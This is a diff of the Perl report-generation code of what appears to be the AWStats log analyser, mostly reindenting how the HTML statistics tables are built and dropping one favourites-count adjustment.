-			if (    $rest_u > 0
-				 || $rest_v > 0
-				 || $rest_p > 0
-				 || $rest_h > 0
-				 || $rest_k > 0 )
+			if (   $rest_u > 0
+				|| $rest_v > 0
+				|| $rest_p > 0
+				|| $rest_h > 0
+				|| $rest_k > 0 )
 			{    # All other domains (known or not)
 				print
 "<tr><td width=\"$WIDTHCOLICON\">&nbsp;</td><td colspan=\"2\" class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
@@ -17468,20 +17648,26 @@ if ( scalar keys %HTMLOutput ) {
 			print "$Center<a name=\"visitors\">&nbsp;</a><br />\n";
 			my $title =
 "$Message[81] ($Message[77] $MaxNbOf{'HostsShown'}) &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=allhosts")
-				  : "$PROG$StaticLinks.allhosts.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=allhosts")
+				: "$PROG$StaticLinks.allhosts.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[80]</a> &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=lasthosts")
-				  : "$PROG$StaticLinks.lasthosts.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=lasthosts")
+				: "$PROG$StaticLinks.lasthosts.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[9]</a> &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=unknownip")
-				  : "$PROG$StaticLinks.unknownip.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=unknownip")
+				: "$PROG$StaticLinks.unknownip.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[45]</a>";
 			&tab_head( "$title", 19, 0, 'visitors' );
 			print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
@@ -17516,7 +17702,7 @@ if ( scalar keys %HTMLOutput ) {
 			$total_p = $total_h = $total_k = 0;
 			my $count = 0;
 			&BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \%_host_h,
-						   \%_host_p );
+				\%_host_p );
 			foreach my $key (@keylist) {
 				print "<tr>";
 				print "<td class=\"aws\">$key</td>";
@@ -17532,9 +17718,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowHostsStats =~ /L/i ) {
 					print '<td nowrap="nowrap">'
-					  . ( $_host_l{$key}
-						  ? Format_Date( $_host_l{$key}, 1 )
-						  : '-' )
+					  . (
+						$_host_l{$key}
+						? Format_Date( $_host_l{$key}, 1 )
+						: '-'
+					  )
 					  . '</td>';
 				}
 				print "</tr>\n";
@@ -17582,18 +17770,21 @@ if ( scalar keys %HTMLOutput ) {
 			print "$Center<a name=\"logins\">&nbsp;</a><br />\n";
 			my $title =
 "$Message[94] ($Message[77] $MaxNbOf{'LoginShown'}) &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=alllogins")
-				  : "$PROG$StaticLinks.alllogins.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=alllogins")
+				: "$PROG$StaticLinks.alllogins.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[80]</a>";
 			if ( $ShowAuthenticatedUsers =~ /L/i ) {
-				$title .=
-				  " &nbsp; - &nbsp; <a href=\""
-				  . ( $ENV{'GATEWAY_INTERFACE'}
-						|| !$StaticLinks
-					  ? XMLEncode("$AWScript?${NewLinkParams}output=lastlogins")
-					  : "$PROG$StaticLinks.lastlogins.$StaticExt" )
+				$title .= " &nbsp; - &nbsp; <a href=\""
+				  . (
+					$ENV{'GATEWAY_INTERFACE'}
+					  || !$StaticLinks
+					? XMLEncode("$AWScript?${NewLinkParams}output=lastlogins")
+					: "$PROG$StaticLinks.lastlogins.$StaticExt"
+				  )
 				  . "\"$NewLinkTarget>$Message[9]</a>";
 			}
 			&tab_head( "$title", 19, 0, 'logins' );
@@ -17630,7 +17821,7 @@ if ( scalar keys %HTMLOutput ) {
 			}
 			my $count = 0;
 			&BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \%_login_h,
-						   \%_login_p );
+				\%_login_p );
 			foreach my $key (@keylist) {
 				my $bredde_p = 0;
 				my $bredde_h = 0;
@@ -17659,9 +17850,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowAuthenticatedUsers =~ /L/i ) {
 					print "<td>"
-					  . ( $_login_l{$key}
-						  ? Format_Date( $_login_l{$key}, 1 )
-						  : '-' )
+					  . (
+						$_login_l{$key}
+						? Format_Date( $_login_l{$key}, 1 )
+						: '-'
+					  )
 					  . "</td>";
 				}
 				print "</tr>\n";
@@ -17707,17 +17900,17 @@ if ( scalar keys %HTMLOutput ) {
 			&tab_head(
 "$Message[53] ($Message[77] $MaxNbOf{'RobotShown'}) &nbsp; - &nbsp; <a href=\""
 				  . (
-					  $ENV{'GATEWAY_INTERFACE'}
-						|| !$StaticLinks
-					  ? XMLEncode("$AWScript?${NewLinkParams}output=allrobots")
-					  : "$PROG$StaticLinks.allrobots.$StaticExt"
+					$ENV{'GATEWAY_INTERFACE'}
+					  || !$StaticLinks
+					? XMLEncode("$AWScript?${NewLinkParams}output=allrobots")
+					: "$PROG$StaticLinks.allrobots.$StaticExt"
 				  )
 				  . "\"$NewLinkTarget>$Message[80]</a> &nbsp; - &nbsp; <a href=\""
 				  . (
-					  $ENV{'GATEWAY_INTERFACE'}
-						|| !$StaticLinks
-					  ? XMLEncode("$AWScript?${NewLinkParams}output=lastrobots")
-					  : "$PROG$StaticLinks.lastrobots.$StaticExt"
+					$ENV{'GATEWAY_INTERFACE'}
+					  || !$StaticLinks
+					? XMLEncode("$AWScript?${NewLinkParams}output=lastrobots")
+					: "$PROG$StaticLinks.lastrobots.$StaticExt"
 				  )
 				  . "\"$NewLinkTarget>$Message[9]</a>",
 				19, 0, 'robots'
@@ -17741,7 +17934,7 @@ if ( scalar keys %HTMLOutput ) {
 			$total_p = $total_h = $total_k = $total_r = 0;
 			my $count = 0;
 			&BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \%_robot_h,
-						   \%_robot_h );
+				\%_robot_h );
 			foreach my $key (@keylist) {
 				print "<tr><td class=\"aws\">"
 				  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
@@ -17757,9 +17950,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowRobotsStats =~ /L/i ) {
 					print "<td>"
-					  . ( $_robot_l{$key}
-						  ? Format_Date( $_robot_l{$key}, 1 )
-						  : '-' )
+					  . (
+						$_robot_l{$key}
+						? Format_Date( $_robot_l{$key}, 1 )
+						: '-'
+					  )
 					  . "</td>";
 				}
 				print "</tr>\n";
@@ -17810,7 +18005,7 @@ if ( scalar keys %HTMLOutput ) {
 			if ($Debug) { debug( "ShowWormsStats", 2 ); }
 			print "$Center<a name=\"worms\">&nbsp;</a><br />\n";
 			&tab_head( "$Message[163] ($Message[77] $MaxNbOf{'WormsShown'})",
-					   19, 0, 'worms' );
+				19, 0, 'worms' );
 			print "<tr bgcolor=\"#$color_TableBGRowTitle\"" . Tooltip(21) . ">";
 			print "<th>" . ( scalar keys %_worm_h ) . " $Message[164]*</th>";
 			print "<th>$Message[167]</th>";
@@ -17829,7 +18024,7 @@ if ( scalar keys %HTMLOutput ) {
 			$total_p = $total_h = $total_k = 0;
 			my $count = 0;
 			&BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \%_worm_h,
-						   \%_worm_h );
+				\%_worm_h );
 			foreach my $key (@keylist) {
 				print "<tr>";
 				print "<td class=\"aws\">"
@@ -17848,9 +18043,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowWormsStats =~ /L/i ) {
 					print "<td>"
-					  . ( $_worm_l{$key}
-						  ? Format_Date( $_worm_l{$key}, 1 )
-						  : '-' )
+					  . (
+						$_worm_l{$key}
+						? Format_Date( $_worm_l{$key}, 1 )
+						: '-'
+					  )
 					  . "</td>";
 				}
 				print "</tr>\n";
@@ -17975,7 +18172,7 @@ if ( scalar keys %HTMLOutput ) {
 			my $total_cre = 0;
 			my $count     = 0;
 			&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_filetypes_h,
-						   \%_filetypes_h );
+				\%_filetypes_h );
 			foreach my $key (@keylist) {
 				my $p_h = '&nbsp;';
 				my $p_k = '&nbsp;';
@@ -18016,20 +18213,20 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $ShowFileTypesStats =~ /C/i ) {
 					if ( $_filetypes_gz_in{$key} ) {
 						my $percent = int(
-										   100 * (
-												  1 - $_filetypes_gz_out{$key} /
-													$_filetypes_gz_in{$key}
-										   )
+							100 * (
+								1 - $_filetypes_gz_out{$key} /
+								  $_filetypes_gz_in{$key}
+							)
 						);
 						printf(
-								"<td>%s</td><td>%s</td><td>%s (%s%)</td>",
-								Format_Bytes( $_filetypes_gz_in{$key} ),
-								Format_Bytes( $_filetypes_gz_out{$key} ),
-								Format_Bytes(
-											  $_filetypes_gz_in{$key} -
-												$_filetypes_gz_out{$key}
-								),
-								$percent
+							"<td>%s</td><td>%s</td><td>%s (%s%)</td>",
+							Format_Bytes( $_filetypes_gz_in{$key} ),
+							Format_Bytes( $_filetypes_gz_out{$key} ),
+							Format_Bytes(
+								$_filetypes_gz_in{$key} -
+								  $_filetypes_gz_out{$key}
+							),
+							$percent
 						);
 						$total_con += $_filetypes_gz_in{$key};
 						$total_cre += $_filetypes_gz_out{$key};
@@ -18055,11 +18252,11 @@ if ( scalar keys %HTMLOutput ) {
 						my $percent =
 						  int( 100 * ( 1 - $total_cre / $total_con ) );
 						printf(
-								"<td>%s</td><td>%s</td><td>%s (%s%)</td>",
-								Format_Bytes($total_con),
-								Format_Bytes($total_cre),
-								Format_Bytes( $total_con - $total_cre ),
-								$percent
+							"<td>%s</td><td>%s</td><td>%s (%s%)</td>",
+							Format_Bytes($total_con),
+							Format_Bytes($total_cre),
+							Format_Bytes( $total_con - $total_cre ),
+							$percent
 						);
 					}
 					else {
@@ -18090,27 +18287,31 @@ if ( scalar keys %HTMLOutput ) {
 "$Center<a name=\"urls\">&nbsp;</a><a name=\"entry\">&nbsp;</a><a name=\"exit\">&nbsp;</a><br />\n";
 			my $title =
 "$Message[19] ($Message[77] $MaxNbOf{'PageShown'}) &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=urldetail")
-				  : "$PROG$StaticLinks.urldetail.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=urldetail")
+				: "$PROG$StaticLinks.urldetail.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[80]</a>";
 			if ( $ShowPagesStats =~ /E/i ) {
-				$title .=
-				  " &nbsp; - &nbsp; <a href=\""
-				  . ( $ENV{'GATEWAY_INTERFACE'}
-						|| !$StaticLinks
-					  ? XMLEncode("$AWScript?${NewLinkParams}output=urlentry")
-					  : "$PROG$StaticLinks.urlentry.$StaticExt" )
+				$title .= " &nbsp; - &nbsp; <a href=\""
+				  . (
+					$ENV{'GATEWAY_INTERFACE'}
+					  || !$StaticLinks
+					? XMLEncode("$AWScript?${NewLinkParams}output=urlentry")
+					: "$PROG$StaticLinks.urlentry.$StaticExt"
+				  )
 				  . "\"$NewLinkTarget>$Message[104]</a>";
 			}
 			if ( $ShowPagesStats =~ /X/i ) {
-				$title .=
-				  " &nbsp; - &nbsp; <a href=\""
-				  . ( $ENV{'GATEWAY_INTERFACE'}
-						|| !$StaticLinks
-					  ? XMLEncode("$AWScript?${NewLinkParams}output=urlexit")
-					  : "$PROG$StaticLinks.urlexit.$StaticExt" )
+				$title .= " &nbsp; - &nbsp; <a href=\""
+				  . (
+					$ENV{'GATEWAY_INTERFACE'}
+					  || !$StaticLinks
+					? XMLEncode("$AWScript?${NewLinkParams}output=urlexit")
+					: "$PROG$StaticLinks.urlexit.$StaticExt"
+				  )
 				  . "\"$NewLinkTarget>$Message[116]</a>";
 			}
 			&tab_head( "$title", 19, 0, 'urls' );
@@ -18153,7 +18354,7 @@ if ( scalar keys %HTMLOutput ) {
 			$max_k   = 1;
 			my $count = 0;
 			&BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \%_url_p,
-						   \%_url_p );
+				\%_url_p );
 			foreach my $key (@keylist) {
 				if ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }
 				if ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) {
@@ -18186,8 +18387,8 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $max_k > 0 ) {
 					$bredde_k =
 					  int( $BarWidth *
-						   ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /
-						   $max_k ) + 1;
+						  ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /
+						  $max_k ) + 1;
 				}
 				if ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }
 				if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
@@ -18199,11 +18400,11 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $ShowPagesStats =~ /B/i ) {
 					print "<td>"
 					  . (
-						  $_url_k{$key}
-						  ? Format_Bytes(
-										  $_url_k{$key} / ( $_url_p{$key} || 1 )
-							)
-						  : "&nbsp;"
+						$_url_k{$key}
+						? Format_Bytes(
+							$_url_k{$key} / ( $_url_p{$key} || 1 )
+						  )
+						: "&nbsp;"
 					  )
 					  . "</td>";
 				}
@@ -18218,7 +18419,7 @@ if ( scalar keys %HTMLOutput ) {
 
 				# Call to plugins' function ShowPagesAddField
 				foreach my $pluginname (
-								 keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
+					keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
 				{
 
 					#					my $function="ShowPagesAddField_$pluginname('$key')";
@@ -18279,9 +18480,11 @@ if ( scalar keys %HTMLOutput ) {
 				}
 				if ( $ShowPagesStats =~ /B/i ) {
 					print "<td>"
-					  . ( $rest_k
-						  ? Format_Bytes( $rest_k / ( $rest_p || 1 ) )
-						  : "&nbsp;" )
+					  . (
+						$rest_k
+						? Format_Bytes( $rest_k / ( $rest_p || 1 ) )
+						: "&nbsp;"
+					  )
 					  . "</td>";
 				}
 				if ( $ShowPagesStats =~ /E/i ) {
@@ -18293,7 +18496,7 @@ if ( scalar keys %HTMLOutput ) {
 
 				# Call to plugins' function ShowPagesAddField
 				foreach my $pluginname (
-								 keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
+					keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
 				{
 
 					#					my $function="ShowPagesAddField_$pluginname('')";
@@ -18325,15 +18528,19 @@ if ( scalar keys %HTMLOutput ) {
 			}
 			my $title =
 "$Message[59] ($Message[77] $MaxNbOf{'OsShown'}) &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=osdetail")
-				  : "$PROG$StaticLinks.osdetail.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=osdetail")
+				: "$PROG$StaticLinks.osdetail.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[80]/$Message[58]</a> &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=unknownos")
-				  : "$PROG$StaticLinks.unknownos.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=unknownos")
+				: "$PROG$StaticLinks.unknownos.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[0]</a>";
 			&tab_head( "$title", 19, 0, 'os' );
 			print
@@ -18341,7 +18548,7 @@ if ( scalar keys %HTMLOutput ) {
 			$total_h = 0;
 			my $count = 0;
 			&BuildKeyList( $MaxNbOf{'OsShown'}, $MinHit{'Os'}, \%new_os_h,
-						   \%new_os_h );
+				\%new_os_h );
 			foreach my $key (@keylist) {
 				my $p = '&nbsp;';
 				if ($Totalh) {
@@ -18409,23 +18616,29 @@ if ( scalar keys %HTMLOutput ) {
 			}
 			my $title =
 "$Message[21] ($Message[77] $MaxNbOf{'BrowsersShown'}) &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=browserdetail")
-				  : "$PROG$StaticLinks.browserdetail.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=browserdetail")
+				: "$PROG$StaticLinks.browserdetail.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[80]/$Message[58]</a> &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=unknownbrowser")
-				  : "$PROG$StaticLinks.unknownbrowser.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=unknownbrowser")
+				: "$PROG$StaticLinks.unknownbrowser.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[0]</a>";
 			&tab_head( "$title", 19, 0, 'browsers' );
 			print
 "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th>$Message[21]</th><th width=\"80\">$Message[111]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th></tr>\n";
 			$total_h = 0;
 			my $count = 0;
-			&BuildKeyList(          $MaxNbOf{'BrowsersShown'}, $MinHit{'Browser'},
-						   \%new_browser_h,           \%new_browser_h );
+			&BuildKeyList(
+				$MaxNbOf{'BrowsersShown'}, $MinHit{'Browser'},
+				\%new_browser_h,           \%new_browser_h
+			);
 			foreach my $key (@keylist) {
 				my $p = '&nbsp;';
 				if ($Totalh) {
@@ -18458,9 +18671,11 @@ if ( scalar keys %HTMLOutput ) {
 					  . "$libbrowser"
 					  . ( $PageDir eq 'rtl' ? "</span>" : "" )
 					  . "</td><td>"
-					  . ( $BrowsersHereAreGrabbers{$key}
-						  ? "<b>$Message[112]</b>"
-						  : "$Message[113]" )
+					  . (
+						$BrowsersHereAreGrabbers{$key}
+						? "<b>$Message[112]</b>"
+						: "$Message[113]"
+					  )
 					  . "</td><td>$new_browser_h{$key}</td><td>$p</td></tr>\n";
 				}
 				$total_h += $new_browser_h{$key};
@@ -18497,8 +18712,7 @@ if ( scalar keys %HTMLOutput ) {
 			my $total_h = 0;
 			my $count   = 0;
 			&BuildKeyList( $MaxNbOf{'ScreenSizesShown'},
-						   $MinHit{'ScreenSize'}, \%_screensize_h,
-						   \%_screensize_h );
+				$MinHit{'ScreenSize'}, \%_screensize_h, \%_screensize_h );
 
 			foreach my $key (@keylist) {
 				my $p = '&nbsp;';
@@ -18605,10 +18819,12 @@ if ( scalar keys %HTMLOutput ) {
 			print "<tr"
 			  . Tooltip(13)
 			  . "><td class=\"aws\"><b>$Message[40]</b> - <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=refererse")
-				  : "$PROG$StaticLinks.refererse.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=refererse")
+				: "$PROG$StaticLinks.refererse.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[80]</a><br />\n";
 			if ( scalar keys %_se_referrals_h ) {
 				print "<table>\n";
@@ -18616,14 +18832,14 @@ if ( scalar keys %HTMLOutput ) {
 				$total_h = 0;
 				my $count = 0;
 				&BuildKeyList(
-							   $MaxNbOf{'RefererShown'},
-							   $MinHit{'Refer'},
-							   \%_se_referrals_h,
-							   (
-								  ( scalar keys %_se_referrals_p )
-								  ? \%_se_referrals_p
-								  : \%_se_referrals_h
-							   )
+					$MaxNbOf{'RefererShown'},
+					$MinHit{'Refer'},
+					\%_se_referrals_h,
+					(
+						( scalar keys %_se_referrals_p )
+						? \%_se_referrals_p
+						: \%_se_referrals_h
+					)
 				);
 				foreach my $key (@keylist) {
 					my $newreferer = $SearchEnginesHashLib{$key}
@@ -18631,7 +18847,7 @@ if ( scalar keys %HTMLOutput ) {
 					print "<tr><td class=\"aws\">- $newreferer</td>";
 					print "<td>"
 					  . (
-						 $_se_referrals_p{$key} ? $_se_referrals_p{$key} : '0' )
+						$_se_referrals_p{$key} ? $_se_referrals_p{$key} : '0' )
 					  . "</td>";
 					print "<td>$_se_referrals_h{$key}</td>";
 					print "</tr>\n";
@@ -18675,10 +18891,12 @@ if ( scalar keys %HTMLOutput ) {
 			print "<tr"
 			  . Tooltip(14)
 			  . "><td class=\"aws\"><b>$Message[41]</b> - <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=refererpages")
-				  : "$PROG$StaticLinks.refererpages.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=refererpages")
+				: "$PROG$StaticLinks.refererpages.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[80]</a><br />\n";
 			if ( scalar keys %_pagesrefs_h ) {
 				print "<table>\n";
@@ -18686,14 +18904,14 @@ if ( scalar keys %HTMLOutput ) {
 				$total_h = 0;
 				my $count = 0;
 				&BuildKeyList(
-							   $MaxNbOf{'RefererShown'},
-							   $MinHit{'Refer'},
-							   \%_pagesrefs_h,
-							   (
-								  ( scalar keys %_pagesrefs_p )
-								  ? \%_pagesrefs_p
-								  : \%_pagesrefs_h
-							   )
+					$MaxNbOf{'RefererShown'},
+					$MinHit{'Refer'},
+					\%_pagesrefs_h,
+					(
+						( scalar keys %_pagesrefs_p )
+						? \%_pagesrefs_p
+						: \%_pagesrefs_h
+					)
 				);
 				foreach my $key (@keylist) {
 					print "<tr><td class=\"aws\">- ";
@@ -18813,10 +19031,10 @@ if ( scalar keys %HTMLOutput ) {
 			&tab_head(
 "$Message[120] ($Message[77] $MaxNbOf{'KeyphrasesShown'})<br /><a href=\""
 				  . (
-					  $ENV{'GATEWAY_INTERFACE'}
-						|| !$StaticLinks
-					  ? XMLEncode("$AWScript?${NewLinkParams}output=keyphrases")
-					  : "$PROG$StaticLinks.keyphrases.$StaticExt"
+					$ENV{'GATEWAY_INTERFACE'}
+					  || !$StaticLinks
+					? XMLEncode("$AWScript?${NewLinkParams}output=keyphrases")
+					: "$PROG$StaticLinks.keyphrases.$StaticExt"
 				  )
 				  . "\"$NewLinkTarget>$Message[80]</a>",
 				19,
@@ -18829,16 +19047,16 @@ if ( scalar keys %HTMLOutput ) {
 			$total_s = 0;
 			my $count = 0;
 			&BuildKeyList( $MaxNbOf{'KeyphrasesShown'},
-						   $MinHit{'Keyphrase'}, \%_keyphrases, \%_keyphrases );
+				$MinHit{'Keyphrase'}, \%_keyphrases, \%_keyphrases );
 			foreach my $key (@keylist) {
 				my $mot;
 
-				# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
+	  # Convert coded keywords (utf8,...) to be correctly reported in HTML page.
 				if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
 					$mot = CleanXSS(
-									 DecodeKey_decodeutfkeys(
-												 $key, $PageCode || 'iso-8859-1'
-									 )
+						DecodeKey_decodeutfkeys(
+							$key, $PageCode || 'iso-8859-1'
+						)
 					);
 				}
 				else { $mot = CleanXSS( DecodeEncodedString($key) ); }
@@ -18884,10 +19102,10 @@ if ( scalar keys %HTMLOutput ) {
 			&tab_head(
 "$Message[121] ($Message[77] $MaxNbOf{'KeywordsShown'})<br /><a href=\""
 				  . (
-					  $ENV{'GATEWAY_INTERFACE'}
-						|| !$StaticLinks
-					  ? XMLEncode("$AWScript?${NewLinkParams}output=keywords")
-					  : "$PROG$StaticLinks.keywords.$StaticExt"
+					$ENV{'GATEWAY_INTERFACE'}
+					  || !$StaticLinks
+					? XMLEncode("$AWScript?${NewLinkParams}output=keywords")
+					: "$PROG$StaticLinks.keywords.$StaticExt"
 				  )
 				  . "\"$NewLinkTarget>$Message[80]</a>",
 				19,
@@ -18900,16 +19118,16 @@ if ( scalar keys %HTMLOutput ) {
 			$total_s = 0;
 			my $count = 0;
 			&BuildKeyList( $MaxNbOf{'KeywordsShown'},
-						   $MinHit{'Keyword'}, \%_keywords, \%_keywords );
+				$MinHit{'Keyword'}, \%_keywords, \%_keywords );
 			foreach my $key (@keylist) {
 				my $mot;
 
 	  # Convert coded keywords (utf8,...) to be correctly reported in HTML page.
 				if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
 					$mot = CleanXSS(
-									 DecodeKey_decodeutfkeys(
-												 $key, $PageCode || 'iso-8859-1'
-									 )
+						DecodeKey_decodeutfkeys(
+							$key, $PageCode || 'iso-8859-1'
+						)
 					);
 				}
 				else { $mot = CleanXSS( DecodeEncodedString($key) ); }
@@ -18952,21 +19170,6 @@ if ( scalar keys %HTMLOutput ) {
 		if ($ShowMiscStats) {
 			if ($Debug) { debug( "ShowMiscStats", 2 ); }
 			print "$Center<a name=\"misc\">&nbsp;</a><br />\n";
-			my $Totalh        = 0;
-			my %new_browser_h = ();
-			if ( $_misc_h{'AddToFavourites'} ) {
-				foreach my $key ( keys %_browser_h ) {
-					$Totalh += $_browser_h{$key};
-					if ( $key =~ /^msie/i ) {
-						$new_browser_h{"msiecumul"} += $_browser_h{$key};
-					}
-				}
-				if ( $new_browser_h{'msiecumul'} ) {
-					$_misc_h{'AddToFavourites'} =
-					  int( 0.5 + $_misc_h{'AddToFavourites'} * $Totalh /
-						   $new_browser_h{'msiecumul'} );
-				}
-			}
 			my $title = "$Message[139]";
 			&tab_head( "$title", 19, 0, 'misc' );
 			print
@@ -18975,15 +19178,15 @@ if ( scalar keys %HTMLOutput ) {
 			print "<th width=\"100\">&nbsp;</th>";
 			print "</tr>\n";
 			my %label = (
-						  'AddToFavourites'           => $Message[137],
-						  'JavascriptDisabled'        => $Message[168],
-						  'JavaEnabled'               => $Message[140],
-						  'DirectorSupport'           => $Message[141],
-						  'FlashSupport'              => $Message[142],
-						  'RealPlayerSupport'         => $Message[143],
-						  'QuickTimeSupport'          => $Message[144],
-						  'WindowsMediaPlayerSupport' => $Message[145],
-						  'PDFSupport'                => $Message[146]
+				'AddToFavourites'           => $Message[137],
+				'JavascriptDisabled'        => $Message[168],
+				'JavaEnabled'               => $Message[140],
+				'DirectorSupport'           => $Message[141],
+				'FlashSupport'              => $Message[142],
+				'RealPlayerSupport'         => $Message[143],
+				'QuickTimeSupport'          => $Message[144],
+				'WindowsMediaPlayerSupport' => $Message[145],
+				'PDFSupport'                => $Message[146]
 			);
 
 			foreach my $key (@MiscListOrder) {
@@ -18999,7 +19202,7 @@ if ( scalar keys %HTMLOutput ) {
 				if ($total) {
 					$p =
 					  int( ( $_misc_h{$key} ? $_misc_h{$key} : 0 ) / $total *
-						   1000 ) / 10;
+						  1000 ) / 10;
 				}
 				print "<tr>";
 				print "<td class=\"aws\">"
@@ -19042,17 +19245,17 @@ if ( scalar keys %HTMLOutput ) {
 				if ( $TrapInfosForHTTPErrorCodes{$key} ) {
 					print "<td><a href=\""
 					  . (
-						  $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
-						  ? XMLEncode(
-								  "$AWScript?${NewLinkParams}output=errors$key")
-						  : "$PROG$StaticLinks.errors$key.$StaticExt"
+						$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
+						? XMLEncode(
+							"$AWScript?${NewLinkParams}output=errors$key")
+						: "$PROG$StaticLinks.errors$key.$StaticExt"
 					  )
 					  . "\"$NewLinkTarget>$key</a></td>";
 				}
 				else { print "<td valign=\"top\">$key</td>"; }
 				print "<td class=\"aws\">"
 				  . (
-					 $httpcodelib{$key} ? $httpcodelib{$key} : 'Unknown error' )
+					$httpcodelib{$key} ? $httpcodelib{$key} : 'Unknown error' )
 				  . "</td><td>$_errors_h{$key}</td><td>$p %</td><td>"
 				  . Format_Bytes( $_errors_k{$key} ) . "</td>";
 				print "</tr>\n";
@@ -19081,7 +19284,7 @@ if ( scalar keys %HTMLOutput ) {
